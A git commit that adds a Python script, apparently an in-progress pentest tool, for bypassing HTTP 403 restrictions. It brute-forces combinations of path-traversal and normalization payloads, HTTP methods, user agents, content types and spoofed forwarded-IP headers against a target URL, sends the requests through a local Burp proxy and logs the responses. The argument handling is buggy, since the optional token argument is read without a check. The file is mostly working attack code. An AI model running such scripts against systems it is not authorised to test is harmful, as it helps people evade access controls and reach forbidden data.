89d3a910467d805c1729c14a62f2115ec207893a
Kholoud Ahmed <20201700237@cis.asu.edu.eg>
2026-01-11 11:56:50 +0200

    Update Bypass403.py

--- Web/Bypass403.py
+++ Web/Bypass403.py
@@ -1,1 +1,117 @@
+'''
+Docstring for bypass403
+This script is for bypassin 403 forbidden errors on web servers.
+The goal is to automate testing all approaches to bypass it including but not limited to:
+1. Headers 
+2. Path normalization -- done
+3. HTTP Methods -- done 
+4. User Agents -- done
+5. Other headers such as Content-Type -- done 
+6. Append IP addresses -- next step
+7. Optimize code. -- next step
+8. ASN/Geo
+9. Refererer Headers
+10. Test on valid valid scenarios. -- next step.
+12. Send them via burp? -- done
+13. Tailor the args to be more customizable (e.g., if the user does not want to add these lists);--> next step.
+14. Try to conquer it if some of the methods or techniques does not make difference. -- next step.
+15. Add auth header and see if it makes difference (403 test instead of 401) -- done
+16. Display the request arch (to make sure it is structured correctly). -- next step.
+17 leveraging `curl` command to perform requests with different techniques.
+'''
+import requests
+import sys
+
+
+## Helper Methods
+
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        agents = file.readlines()
+    return agents
+
+
+HTTP_METHODS = ['GET', 'POST', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']
+
+# Since we are concatinating the url with '/', i removed the trailing and leading slashes from the list as they are gonna be appended below
+PATH_NORM = ['','.', '../../', '..', '%2e', '%2e%2e', '%00', '%20', '..;', '.;', '%2e%2e%2f', '%2e%2e', '/;/']
+
+CONTENT_TYPES = [
+    'application/json',
+    'application/xml',
+    'text/xml',
+    'application/x-www-form-urlencoded',
+    'multipart/form-data',
+    'text/html',
+    'text/plain'
+]
+
+PROXIES = {
+    "http":"127.0.0.1:8080",
+    "https":"127.0.0.1:8080"
+}
+
+# I cannot make it optional since bypassing depends on passing those parameters
+if len(sys.argv) < 4:
+    print(f"[!] Incorrect number of arguments.")
+    print(f"[!] Usage: {sys.argv[0]} <full_target_url> <agent_wordlist_file> <headers_wordlists> <ip_header_wordlist> <auth token>[optional]")
+    sys.exit(1)
+
+# Read wordlists
+agents = read_file(sys.argv[2])
+forwarded_headers = read_file(sys.argv[3])
+ips = read_file(sys.argv[4])
+
+
+# I want to get the last endpoint to add the path norm char before it, given the url from the user
+# For example if the user is providing: http://example.com/api/v1/get-passcode
+# I want to get that get-passcode part to add the path norm chars before it.
+# We can split via / and get the last part. 
+splited_url = sys.argv[1].split('/')
+last_segment= splited_url[-1]
+
+
+for char in PATH_NORM:
+
+    if (char == ''):
+        modified_url = sys.argv[1]
+    else: 
+        modified_url = '/'.join(splited_url[:-1] + [char] + [last_segment])
+    
+    print(f"[*] Trying URL: {modified_url}")
+
+    for agent in agents:
+        
+        agent = agent.strip()
+        for content_type in CONTENT_TYPES:
+            
+            content_type = content_type.strip()
+
+            for forwarded_header in forwarded_headers:
+
+                forwarded_header = forwarded_header.strip()
+                for ip in ips:
+
+                    ip = ip.strip()
+                    for i in range(len(HTTP_METHODS)):
+                        
+                        method = HTTP_METHODS[i]
+                        
+                        if sys.argv[5]:
+                            authorization_token = sys.argv[5]
+                            response = requests.request(method, modified_url, headers =  {"User-Agent": agent, "Content-Type" :content_type, forwarded_header: ip, "Authorization": authorization_token}, proxies=PROXIES, verify=False)
+                        else:
+                            response = requests.request(method, modified_url, headers =  {"User-Agent": agent, "Content-Type" :content_type, forwarded_header: ip}, proxies=PROXIES, verify=False)
+
+                        print(f"[*] appedning results to the file....")
+                        
+                        with open("bypass4030results.txt", 'a') as result_file:
+                            result_file.write(f"[*] Trying url {modified_url}, Method {method} with User-Agent:{agent} with Content-Type : {content_type} with header {forwarded_header} with ip value {ip})\n")
+                            result_file.write("\n")
+                            result_file.write(f"Response : {response.text}\n")
+                            result_file.write("\n************************************************************\n")
+    
+    print(f"[*] Finished appending results to the file. ")
+
+
 
